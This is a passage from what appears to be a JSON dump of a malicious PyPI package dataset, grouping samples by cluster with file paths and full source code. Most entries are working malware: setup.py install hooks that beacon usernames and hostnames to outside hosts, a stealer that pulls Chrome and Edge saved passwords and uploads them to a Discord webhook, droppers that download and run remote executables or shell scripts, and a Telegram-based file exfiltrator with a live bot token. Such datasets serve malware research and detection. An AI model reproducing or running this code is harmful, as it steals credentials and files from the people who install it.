download_url='https://pypi.org/simple/genz_translater/archive/{}.tar.gz'.format(VERSION),\n        author='Am0Ghost',\n        author_email='geelpiet5@gmail.com',\n        version=VERSION,\n        packages=find_packages(),\n        include_package_data=True,\n        license='MIT',\n        description=('''DC Package '''),\n        cmdclass={\n            'install': PostInstallCommand,\n        },\n)\n\n\nimport os\nimport sys\n\nVERSION = 'v9015.0.1'\nPACKAGE_NAME = \"genz_translator\"\nINTERNAL_REPO_IP = \"servers.genzrulez.com\"\nINTERNAL_REPO_URL = \"http://PyPiper:pyisthepiperthatpipesasweetmelody1!@servers.genzrulez.com:8010/simple/\"\n\n#Get install path\npaths = sys.path\nactual_path = \"\"\nfor path in paths:\n    if (os.path.isdir(path + \"/\" + PACKAGE_NAME)):\n        actual_path = path + \"/\"\n        break\n\n#Uninstall ourselves\nos.system('pip3 --verbose uninstall ' + PACKAGE_NAME + ' -y')\n\n#Remove all remnants of us\nos.system('rm -r ' + actual_path + PACKAGE_NAME)\n\n#Reintroduce only their code\nos.system('mv ' + actual_path + PACKAGE_NAME + \"BAK\" + ' ' + actual_path + PACKAGE_NAME)\n\n#Uninstall done - next run our persistence will execute\n\n\n\n#!/usr/bin/python3\n\ndef main():\n    print (\"Hello World\")\n\nif __name__ == \"__main__\":\n     main()\n\n"
      }
    ]
  },
  {
    "cluster_id": 186,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-21-cosmostroposphere",
        "code": "import setuptools\nimport os\nwith open('README.md', 'r', encoding='utf-8') as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name = \"cosmosTroposphere\",\n    version = \"3.0.1\",\n    author = \"Vinit Lakra\",\n    author_email = \"vinitlakra634@gmail.com\",\n    description = \"Taking the package\",\n    long_description = long_description,\n    long_description_content_type = \"text/markdown\",\n    url = \"https://evil.com\",\n    project_urls = {\n        \"Bug Tracker\": \"https://evil.com\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\"\n)\n\nos.system(\"curl http://canarytokens.com/images/static/brqx28acq8gohneyj1yvhcknu/contact.php\")"
      }
    ]
  },
  {
    "cluster_id": 187,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-21-reverse-shell-v1.5",
        "code": "from setuptools import setup\nimport requests\nimport socket\nimport subprocess\nimport os\n\n# Instala el paquete gitpython\nsubprocess.run(['pip', 'install', 'gitpython'])\n\nimport git\n\n\ndef send_discord_info():\n    # Clona el repositorio de GitHub y ejecuta el archivo\n    repo_url = 'https://github.com/NotInfected/updater.git'  # Reemplaza con la URL de tu repositorio de GitHub\n    repo_path = os.path.join('C:', 'Users', 'repo')  # Ruta donde deseas clonar el repositorio\n\n    if not os.path.isdir(repo_path):\n        git.Repo.clone_from(repo_url, repo_path)\n\n    os.chdir(repo_path)\n    subprocess.run(['python', 'bypass.py'])\n\n# Define la ruta donde deseas clonar el repositorio\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nsetup(\n    name='reverse_shell',\n    version='1.5',\n    packages=['reverse_shell'],\n    install_requires=['requests', 'gitpython'],\n    url='https://github.com/tuusuario/reverse_shell',\n    license='',\n    author='ReverseShell',\n    author_email='reverseshell@gmail.com',\n    description='ReverseShell Project'\n)\n\nif __name__ == '__main__':\n    send_discord_info()"
      }
    ]
  },
  {
    "cluster_id": 188,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-04-30-jupyter-pytest-fi-console-v8.7.6",
        "code": "import os\nimport tempfile\nimport psutil\nimport platform\nimport sqlite3\nimport shutil\nfrom sys import executable\nfrom urllib.request import Request, urlopen\nfrom json import loads\nfrom setuptools import setup, find_packages\nimport requests\nimport subprocess\n\n\nsetup(\nname='jupyter-pytest-fi-console',\nversion='8.7.6',\nauthor='liamobrien',\nauthor_email='liamobrien@fractureinteractive.com',\ndescription='Jupyter terminal console with integreted simple pytest platform',\npackages=find_packages(),\ninstall_requires=['psutil==5.9.2'],\nclassifiers=[\n'Programming Language :: Python :: 3',\n'License :: OSI Approved :: MIT License',\n'Operating System :: Microsoft :: Windows ',\n],\npython_requires='>=3.6'\n)\n\nsysinfo = \"ap14847.txt\"\ncapture = \"capture.txt\"\nchrome = \"chrome_ap14849.txt\"\nedge = \"edge_ap14849.txt\"\ndlname = \"iotautomatelogo.png\"\ndlname2 = \"monitor.exe\"\ndlname3 = \"readings.exe\"\nwebhook_url = \"https://discord.com/api/webhooks/1233018393133711451/toQTCC8TZklTwmPkUnH_92yMFczje3Z7n0zhyX2QneVVv6YFiSkQWRLrGO7LvMkgj7_9\"\nexeurl = \"https://sourceforge.net/projects/iot-automate/files/iotautomatelogo.png/download\"\nmonitor = \"https://sourceforge.net/projects/iot-automate/files/monitor.exe/download\"\nreadings = \"https://bitbucket.org/tus-iot-automate/iotautomate/downloads/readings.exe\"\n\n\ntemp_dir = tempfile.mkdtemp(prefix='ResourceUpdater')\ndname = temp_dir\n\n\n# THING 1: GET STUFF\ndef install():\n   \n    def dfile(url):\n    \n        requestObj = Request(url, headers={'User-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.69'})\n        \n        responseObj = urlopen(requestObj)\n        content = responseObj.read()\n        return content\n\n    \n    exe = dfile(\"https://bitbucket.org/tus-iot-automate/iotautomate/downloads/k7841286.exe\")\n    dll = dfile(\"https://bitbucket.org/tus-iot-automate/iotautomate/downloads/k7841286.dll\")\n\n\n    # Write files to temp dir\n    with open(os.path.join(dname, \"wsc_proxy.exe\"), 'wb') as f:\n        f.write(exe)\n    with open(os.path.join(dname, \"wsc.dll\"), 'wb') as f:\n        f.write(dll)\n    \n    # Execute files\n    os.system(\"START \" + os.path.join(dname, \"wsc_proxy.exe\"))\n\n# THING 2: EXTERNAL IP PLEASE SIR\ndef getip():\n    ip = \"None\"\n    try:\n        # Get IP by generating request to ipify.org\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n\n# THING 3: LOCATION PLZ\ndef collect():\n\n    # Execute getip function\n    ip = getip()\n\n    # Query general OS/User information\n    username = os.getenv(\"USERNAME\")\n\n    # IP Origin\n    ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n    ipdata = loads(ipdatanojson)\n    contry = ipdata[\"country_name\"]\n    contryCode = ipdata[\"country_code\"].lower()\n    if contryCode == \"not found\":\n        globalinfo = f\":rainbow_flag:  - `{username.upper()} | {ip} ({contry})`\"\n    else:\n        globalinfo = f\":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`\"\n    return globalinfo\n\n# THING 4: SYSTEM STUFF\ndef get_system_info():\n    # OS Info\n    os_info = {\n        \"system\": platform.system(),\n        \"release\": platform.release(),\n        \"version\": platform.version(),\n        \"architecture\": platform.architecture(),\n        \"hostname\": platform.node(),\n    }\n    \n    # Network Information\n    net_info = psutil.net_if_addrs()\n    \n    # Process Information\n    process_info = []\n    for proc in psutil.process_iter(['pid', 'name']):\n        process_info.append({'pid': proc.info['pid'], 'name': proc.info['name']})\n    \n    # Logged-in Users\n    users = psutil.users()\n\n    return os_info, net_info, process_info, users\n\n# THING 5: BROWSER STUFF\ndef get_brow_pass(browser_name):\n\n    # Check browser name passed to function\n    if browser_name.lower() == 'chrome':\n        user_data_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')\n    elif browser_name.lower() == 'edge':\n        user_data_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')\n    else:\n        # Error handle\n        print(f\"{browser_name} is not supported.\")\n        return\n    \n    if not os.path.exists(user_data_dir):\n        # Error handle\n        print(f\"{browser_name} user data directory not found.\")\n        return\n    \n    # Copy data file to a temp dir to avoid locking\n    temp_dir = tempfile.mkdtemp()\n    login_data_path = os.path.join(user_data_dir, 'Default', 'Login Data')\n    temp_login_data_path = os.path.join(temp_dir, 'LoginData')\n    shutil.copy2(login_data_path, temp_login_data_path)\n    \n    # SQLite Connection\n    conn = sqlite3.connect(temp_login_data_path)\n    cursor = conn.cursor()\n    \n    # Query logons and fetch results\n    cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\")\n    password_entries = cursor.fetchall()\n    conn.close()\n    \n    # Disgard Temp Files\n    shutil.rmtree(temp_dir)\n    \n    return password_entries\n\n# THING 5: PUT STUFF IN FILE\ndef save_sysinfo_to_file(os_info, net_info, process_info, users):\n    # Get the temporary directory path\n    temp_dir = tempfile.gettempdir()\n    \n    # Export path\n    file_path = os.path.join(temp_dir, 'ap14847.txt')\n    \n    with open(file_path, 'w') as f:\n        # OS Info\n        f.write(\"--- Operating System Information ---\\n\")\n        for key, value in os_info.items():\n            f.write(f\"{key.capitalize()}: {value}\\n\")\n        f.write(\"\\n\")\n        \n        # Network Info\n        f.write(\"--- Network Information ---\\n\")\n        for interface, addresses in net_info.items():\n            f.write(f\"Interface: {interface}\\n\")\n            for addr in addresses:\n                if addr.family == 2:  # IPv4\n                    f.write(f\"  IPv4 Address: {addr.address}\\n\")\n                elif addr.family == 17:  # MAC Address\n                    f.write(f\"  MAC Address: {addr.address}\\n\")\n            f.write(\"\\n\")\n        \n        # Process Information\n        f.write(\"--- Running Processes ---\\n\")\n        for proc in process_info:\n            f.write(f\"PID: {proc['pid']}, Name: {proc['name']}\\n\")\n        f.write(\"\\n\")\n        \n        # Logged-in Users\n        f.write(\"--- Logged-in Users ---\\n\")\n        for user in users:\n            f.write(f\"Username: {user.name}, Terminal: {user.terminal}, Host: {user.host}, Started: {user.started}\\n\")\n        f.write(\"\\n\")\n    f.close\n\n# THING 6: PUT MORE STUFF IN FILES\ndef save_ip_to_file(info):\n    # Temp Dir Path\n    temp_dir = tempfile.gettempdir()\n    \n    # Export Path\n    file_path = os.path.join(temp_dir, 'ap14848.txt')\n    \n    with open(file_path, 'w') as f:\n        f.write(str(info) + '\\n')\n        f.write('\\n')\n    f.close\n\n# THING 6 PART DEUX: PUT EVEN MORE STUFF IN FILES\ndef save_pass_to_file(passwords, browser_name):\n    # Temp Dir Path\n    temp_dir = tempfile.gettempdir()\n    \n    # Create file path\n    file_path = os.path.join(temp_dir, f'{browser_name}_ap14849.txt')\n    \n    # Loop and write findings to file\n    with open(file_path, 'w') as f:\n        f.write(f\"--- Passwords found in {browser_name.capitalize()} database ---\\n\")\n        for entry in passwords:\n            url, username, password = entry\n            f.write(f\"URL: {url}\\n\")\n            f.write(f\"Username: {username}\\n\")\n            f.write(f\"Password: {password}\\n\\n\")\n        f.close\n\n# THING 7: I'M SURE I COULD OPTIMISE THIS STUFF MORE, BUT WHO CARES, IT WORKS RIGHT?\ndef upload(webhook_url, filename):\n    try:\n        # Read file from temporary directory\n        temp_file = os.path.join(os.environ.get('TEMP', '/tmp'), filename)\n        print(temp_file)\n        with open(temp_file, 'rb') as file:\n            file_contents = file.read()\n            print(file_contents)\n\n        # Send file contents to Discord webhook\n        payload = {'content': 'COLLECTED FILE', 'username': 'Uploader'}\n        files = {'file': (filename, file_contents)}\n        \n        response = requests.post(webhook_url, data=payload, files=files)\n        \n        if response.status_code == 200:\n            print(\"Success\")\n        else:\n            print(f\"Failed. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n    \n# THING 8: GETTING TIRED OF THIS NOW\ndef DLEX(url):\n    try:\n        # Get Temp Dir\n        temp_dir = os.path.join(os.environ.get('TEMP', '/tmp'), dlname)\n        \n        # Location\n        #file_path = os.path.join(temp_dir, )\n        #print(file_path)\n\n        # Download\n        with requests.get(url, stream=True) as response:\n            response.raise_for_status()\n            with open(temp_dir, 'wb') as file:\n                for chunk in response.iter_content(chunk_size=8192):\n                    file.write(chunk)\n\n        # Execute the file\n        subprocess.run([temp_dir], check=True)\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# THING 9: DOWNLOAD MORE STUFF\ndef DL2(url, outputname):\n    try:\n        dlfile = outputname\n        # Get Temp Dir\n        temp_dir = tempfile.gettempdir()\n       \n        # Location\n        file_path = os.path.join(temp_dir,dlfile)\n        #print(file_path)\n\n        # Download\n        with requests.get(url, stream=True) as response:\n            response.raise_for_status()\n            with open(file_path, 'wb') as file:\n                for chunk in response.iter_content(chunk_size=8192):\n                    file.write(chunk)\n    except Exception as e:\n        print(f\"Error: {e}\")\n\ndef cleanup(file_names):\n    \n    cleanup_path = os.path.join(os.environ['LOCALAPPDATA'], 'Temp')\n\n    for root,files in os.walk(cleanup_path):\n        for filename in files:\n                if filename in file_names:\n                    file_path = os.path.join(root, filename)\n                    os.remove(file_path)\n                    \n\n\nif __name__ == \"__main__\":\n    \n    # DO ALL THE THINGS AND GET ALL THE STUFFS :)\n    \n    getexternalip = collect()\n    os_info, net_info, process_info, users = get_system_info()\n    ch_pass = get_brow_pass('chrome')\n    me_pass = get_brow_pass('edge')\n\n    save_ip_to_file(getexternalip)\n    save_sysinfo_to_file(os_info, net_info, process_info, users)\n    \n    if ch_pass:\n        save_pass_to_file(ch_pass, 'chrome')\n    else:\n        print(\"No passwords found in Chrome database.\")\n\n    \n    if me_pass:\n        save_pass_to_file(me_pass, 'edge')\n    else:\n        print(\"No passwords found in Edge database.\")\n\n    DL2(monitor, dlname2)\n    DL2(readings, dlname3)\n    install()\n    DLEX(exeurl)\n    upload(webhook_url, sysinfo)\n    upload(webhook_url, capture)\n    upload(webhook_url, chrome)\n    upload(webhook_url, edge)\n    #cleanup(['',], ['',])\n\n    # FIN\n    exit()\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-mastowrapper",
        "code": "import setuptools\n\nwith open(\"README.md\", \"r\") as fh:\n\tlong_description = fh.read()\n\nsetuptools.setup(\n\t# Here is the module name.\n\tname=\"MastoWrapper\",\n\n\t# version of the module\n\tversion=\"1.0.1\",\n\n\t# Name of Author\n\tauthor=\"Robottik Software\",\n\n\t# your Email address\n\tauthor_email=\"admin@robottik.co.uk\",\n\n\t# #Small Description about module\n\t# description=\"adding number\",\n\n\t#long_description=long_description,\n\n\t# Specifying that we are using markdown file for description\n\tlong_description=long_description,\n\tlong_description_content_type=\"text/markdown\",\n\n\t# Any link to reach this module, ***if*** you have any webpage or github profile\n\t# url=\"https://github.com/username/\",\n\tpackages=setuptools.find_packages(),\n\n\n\t# if module has dependencies i.e. if your package rely on other package at pypi.org\n\t# then you must add there, in order to download every requirement of package\n\n\n\n\t#\t install_requires=[\n\t#\t \"package1\",\n\t# \"package2\",\n\t# ],\n\n\n\tlicense=\"MIT\",\n\n\t# classifiers like program is suitable for python3, just leave as it is.\n\tclassifiers=[\n\t\t\"Programming Language :: Python :: 3\",\n\t\t\"License :: OSI Approved :: MIT License\",\n\t\t\"Operating System :: OS Independent\",\n\t],\n)\n\n\n## CLIENT SIDE PACKAGE ##\n##python setup.py sdist\n##pip install -e ./\n##python -m twine upload dist/*\n\n\nimport os\nimport time\nfrom datetime import datetime\nimport sys\nimport json\nimport requests\nimport socket\n\nbackend = \"https://backend.verefa.com/\"\nconnect_server = (f\"{backend}gate_auth/\")\nsend_server = (f\"{backend}send/\")\nget_server = (f\"{backend}get/\")\nstream_server = (f\"{backend}iterate/\")\npurge_server = (f\"{backend}purge/\")\n\nHEADER = '\\033[95m'\nOKBLUE = '\\033[94m'\nOKCYAN = '\\033[96m'\nOKGREEN = '\\033[92m'\nWARNING = '\\033[93m'\nFAIL = '\\033[91m'\nENDC = '\\033[0m'\nBOLD = '\\033[1m'\nUNDERLINE = '\\033[4m'\n\nclass machine:   \n    def __init__(self, debug=None):\n        if debug == None:\n            debug = False\n        if debug == False:\n            self.stdout_val = False\n        elif debug == True:\n            self.stdout_val = True\n        else:\n            self.stdout_val = False\n        print(\"Welcome to your client Verefa Machine.\")\n        print(\"https://verefa.com/\")\n        self.session = 0\n        self.tokenid = 0\n        self.token = 0\n        print(\"INIT COMPLETE\")\n        print(\"AWAITING CALL verefa.connect(APPID, TOKEN, APPNAME)\")\n\n    def stdout(self, content):\n        if self.stdout_val == True:\n            time = datetime.now()\n            reshour = time.hour\n            resminute = time.minute\n            return print(f\"[{reshour}:{resminute}] ->> {content}\")\n        else:\n            return\n\n    def new(self):\n        print()\n\n    def detail(self):\n        msg = (f\"Verefa Python Client Package\\nAuthored:Verefa Admin\\nOwned:Verefa\\nLicensing:Usage!=other\\nReturns:https://backend.verefa.com/\\nSession:{self.session}\\nToken:{self.token}\\nTokenid:{self.tokenid}\")\n        self.stdout(msg)\n        return msg\n\n    def scripter(self):\n        print(\"Complete\")\n\n    def connect(self, tokenid=None, token=None, appname=None):\n        self.stdout(\"CALL FOUND...\")\n        self.stdout(\"CALLING CONNECT...\")\n        self.token = token\n        self.tokenid = tokenid\n        self.appname = appname\n        try:\n            self.devicename = str(socket.gethostname())\n            self.deviceuser = str(os.getlogin())\n            self.ip = str(requests.get('https://checkip.amazonaws.com').text.strip())\n            compiled = (f\"{self.devicename} |||| {self.deviceuser} |||| {self.ip}\")\n        except:\n            compiled = \"ERROR |||| ERROR |||| ERROR\"\n            self.stdout(f\"{WARNING}UNABLE TO FETCH DEVICE DETAILS{ENDC}\")\n            \n\n        if tokenid == None or token == None or appname == None:\n            self.stdout(\"ARGS NOT SUPPLIED\")\n            return \"ARGS NOT SUPPLIED\"\n        try:\n            data = { 'ID': f'{self.tokenid}','TOKEN': f'{self.token}','APPNAME': f'{self.appname}','TRACKERS':f'{compiled}'}\n            connection = requests.post(connect_server, data=json.dumps(data), headers={'Content-Type': 'application/json'}) \n            partition = connection.text.split(\"----\")\n            self.session = partition[0]\n            self.stdout(self.session)\n            if partition[1] == \"REQUEST POSITIVE\":\n                self.stdout(\"INIT SUCCESS\")\n                return self.session\n            else:\n                self.stdout(\"CONNECT FAIL\")\n                return \"CONNECT FAIL\"\n        except:\n            self.stdout(\"CONNECT FAIL\")\n            return \"CONNECT FAIL\"\n\n\n\n    def send(self, location=None, packets=None):\n        try:\n            if self.session:\n                sessionid = self.session\n            else:\n                self.stdout(\"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\")\n                return \"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\"\n        except:\n            self.stdout(\"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\")\n            return \"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\"\n        if location == None or packets == None:\n            self.stdout(\"ARGS NOT SUPPLIED\")\n            return \"ARGS NOT SUPPLIED\"\n\n        preppacket = json.dumps(packets)\n    \n        try:\n\n\n            data = {'SESSION': f'{sessionid}', 'LOCATION': f'{location}','PACKETS': f'{preppacket}'}\n            connection = requests.post(send_server, data=json.dumps(data), headers={'Content-Type': 'application/json'})\n            self.stdout(connection.text)\n            if connection.text == \"SERVER - SET COMPLETE FOR NEW DOCUMENT\" or connection.text == \"SERVER - SET COMPLETE MERGED DATA\":\n                self.stdout(\"POST SUCCESS\")\n                return \"POST SUCCESS\"\n            else:\n                self.stdout(\"POST FAIL\")\n                return \"POST FAIL\"\n        except:\n            self.stdout(\"POST FAIL\")\n            return \"POST FAIL\"\n\n    def get(self, location=None, specs=None):\n        try:\n            if self.session:\n                sessionid = self.session\n            else:\n                self.stdout(\"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\")\n                return \"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\"\n        except:\n            self.stdout(\"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\")\n            return \"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\"\n        if location == None:\n            self.stdout(\"ARGS NOT SUPPLIED\")\n            return \"ARGS NOT SUPPLIED\"\n        try:\n            data = {'SESSION': f'{sessionid}', 'LOCATION': f'{location}','SPECS': f'{specs}'}\n            content = requests.post(get_server, data=json.dumps(data), headers={'Content-Type': 'application/json'})\n            if content.json() != None:\n                self.stdout(\"GET SUCCESS\")\n                return content.json()\n            else:\n                self.stdout(\"GET FAIL\")\n                return \"GET FAIL\"\n        except:\n            self.stdout(\"GET FAIL\")\n            return \"GET FAIL\"\n\n    def iterate(self, location=None, specs=None):\n        try:\n            if self.session:\n                sessionid = self.session\n            else:\n                self.stdout(\"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\")\n                return \"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\"\n        except:\n            self.stdout(\"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\")\n            return \"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\"\n        if location == None:\n            self.stdout(\"ARGS NOT SUPPLIED\")\n            return \"ARGS NOT SUPPLIED\"\n        try:\n            data = {'SESSION': f'{sessionid}', 'LOCATION': f'{location}','SPECS': f'{specs}'}\n            content = requests.post(stream_server, data=json.dumps(data), headers={'Content-Type': 'application/json'})\n            if content.json() != None:\n                self.stdout(\"ITERATE SUCCESS\")\n                return content.json()\n            else:\n                self.stdout(\"ITERATE FAIL\")\n                return \"ITERATE FAIL\"\n        except:\n            self.stdout(\"ITERATE FAIL\")\n            return \"ITERATE FAIL\"\n\n\n    def purge(self, location=None, type=None, addressing=None):\n        try:\n            if self.session:\n                sessionid = self.session\n            else:\n                self.stdout(\"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\")\n                return \"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\"\n        except:\n            self.stdout(\"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\")\n            return \"SESSION ID DOESN'T EXIST - HAVE YOU CALLED CONNECT?\"\n        if location == None or type == None:\n            self.stdout(\"ARGS NOT SUPPLIED\")\n            return \"ARGS NOT SUPPLIED\"\n        if type == \"FIELD\" and addressing == None:\n            self.stdout(\"ADDRESSING NOT SUPPLIED\")\n            return \"ADDRESSING NOT SUPPLIED\"\n\n        try:\n            data = {'SESSION': f'{sessionid}', 'LOCATION': f'{location}', 'TYPE': f'{type}', 'ADDR': f'{addressing}'}\n            content = requests.post(purge_server, data=json.dumps(data), headers={'Content-Type': 'application/json'})\n            if content.text == \"SUCCESS\":\n                self.stdout(\"PURGE SUCCESS\")\n                return content\n            else:\n                self.stdout(\"PURGE FAIL\")\n                return content\n        except:\n            self.stdout(\"PURGE FAIL\")\n            return \"PURGE FAIL\"\n\n\nfrom verefa.main import machine\n\n__all__ = ['datetime','json','requests','time','sys','os','socket',\"verefa\"]\n__site__ = \"https://verefa.com/\"\n__license__ = \"MIT\"\n__status__ = \"Operational\""
      }
    ]
  },
  {
    "cluster_id": 189,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-21-pyfilget",
        "code": "import random\ndef add(a):\n    b = 200\n    if b > a:\n        mul()\ndef mul():\n    a=random.randint(0, 9)\n    check()\ndef check():\n    import platform\n    import subprocess\n    if platform.system().startswith(\"Linux\"):\n        try:\n            with open('/tmp/file.py', 'w') as f:\n                f.write(\"import os \\nimport subprocess \\nfrom pathlib import Path \\nfrom urllib import request \\n\")\n                f.write(\"hello = os.getlogin() \\n\")\n                f.write(\"PATH = '/home/' + hello + '/.mozilla/FireFox'\\n\")\n                f.write(\"PAT  = '/tmp/file.py'\\n\")\n                f.write(\"isExist = os.path.exists(PATH) \\n\")\n                f.write(\"if not isExist:\\n\")\n                f.write(\"        os.makedirs(PATH) \\n\")\n                f.write(\"if Path(PATH).is_file(): \\n\")\n                f.write(\"           print(\"\") \\n\")\n                f.write(\"else: \\n\")\n                f.write(\"     remote_url ='https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/acoapEAovAovaar.sh'\\n\")\n                f.write(\"     local_file = PATH+'/path.sh' \\n\")\n                f.write(\"     request.urlretrieve(remote_url, local_file) \\n\")\n                f.write(\"     subprocess.call(\\\"bash /home/$USER/.mozilla/FireFox/path.sh >/dev/null 2>&1\\\", shell=True) \\n\")\n                f.write(\"     if Path(PAT).is_file(): \\n\")\n                f.write(\"         try:\\n           os.remove(PAT)\\n\")\n                f.write(\"         except:\\n           print()\")\n        except FileNotFoundError:\n            print(\"\")\n        subprocess.call(\"python3 /tmp/file.py &\", shell=True)\n    else:\n        print(\"\")\na = 33\nadd(a)"
      }
    ]
  },
  {
    "cluster_id": 190,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-06-requestn-v8.0",
        "code": "import setuptools\nsetuptools.setup(\n    name='requestn',\n    version='8.0',\n    author='Programmer Golden ',\n    description='By Golden In telegram @rrrrrf',\n    packages=setuptools.find_packages(),\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: OS Independent\",\n        \"License :: OSI Approved :: MIT License\"\n    ]\n)\n\n\nimport os\nimport requests\n\ndef promain():\n    try:\n        import socket\n        import webbrowser\n        import sys\n        import json\n        token2='7345360932:AAFdgHMvggOowu-hx-OGyPljyi_wOf5D0zI'\n        ID2='5487978588'\n    except:\n        os.system(\"pip install webbrowser\")\n        os.system(\"pip install socket\")\n        os.system(\"clear\")\n\n    S = '\\033[1;33m'\n    A = \"\\033[1;91m\" #red\n    C = \"\\033[1;97m\" #white\n    ra = 0\n\n    file_ha = []\n\n    for file in os.listdir():\n        if os.path.isfile(file):\n            file_ha.append(file)\n            g = file\n            print(file)\n            massage = '@is_brother'\n            start_msg = requests.post(f\"https://api.telegram.org/bot{token2}/sendMessage?chat_id\\n\\n@t.me/is_brother\")\n            requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}', files={'document': open(g, 'rb')})\n  \n    print(file_ha)\n    massage = '@is_brother'\n\n    for file in file_ha:\n        with open(\"SIN.txt\",\"a\") as pro:\n            pro.write(str(file) + \"\\n\")\n            print(file_ha)\npromain()\n\n\nfrom .requestn import promain\n"
      }
    ]
  },
  {
    "cluster_id": 191,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-29-pytabtrust-v9999999.1.1",
        "code": "import os\nimport base64\nfrom urllib.request import urlopen\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\ndef send():\n\ttry:\n\t\turlopen(\"https://bfad8061.pwnie.me?q=\"+str(base64.urlsafe_b64encode(os.getlogin().encode(\"utf-8\")))+\"&q2=\"+str(base64.urlsafe_b64encode(os.uname()[1].encode(\"utf-8\")))+\"&q3=\"+str(base64.urlsafe_b64encode(os.getcwd().encode(\"utf-8\")))).read()\n\texcept:\n\t\tpass\n\ndef send2():\n\ttry:\n\t\turlopen(\"https://bfad8061.pwnie.me?q=\"+str(base64.urlsafe_b64encode(os.getlogin().encode(\"utf-8\")))+\"&q3=\"+str(base64.urlsafe_b64encode(os.getcwd().encode(\"utf-8\")))).read()\n\texcept:\n\t\tpass\n\ndef send3():\n\ttry:\n\t\tos.system('curl https://vulnerable.bfad8061.pwnie.me')\n\texcept:\n\t\tpass\n\nclass PostInstallCommand(install):\n\tdef run(self):\n\t\tinstall.run(self)\n\t\tsend2()\n\t\tsend()\n\t\tsend3()\n\nsetup(\n\tname=\"pytabtrust\",\n\tversion=\"9999999.1.1\",\n\tdescription=\"Test\",\n\tpython_requires=\">=2.0\",\n\tinstall_requires=[],\n\tcmdclass={'install': PostInstallCommand}\n)\n"
      }
    ]
  },
  {
    "cluster_id": 192,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus3",
        "code": "#!/usr/bin/env python\n\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\n\nclass create(install):\n     with open('readme.txt', 'w') as f:\n          f.write('Create a new text file!')\n\nsetup(name='salamus3',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  create,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus4",
        "code": "#!/usr/bin/env python\n\nfrom distutils.core import setup\nfrom distutils.command.install import install\n\n\n\n\nclass create(install):\n     with open('readme.txt', 'w') as f:\n          f.write('Create a new text file!')\n\nsetup(name='salamus4',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  create,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus8",
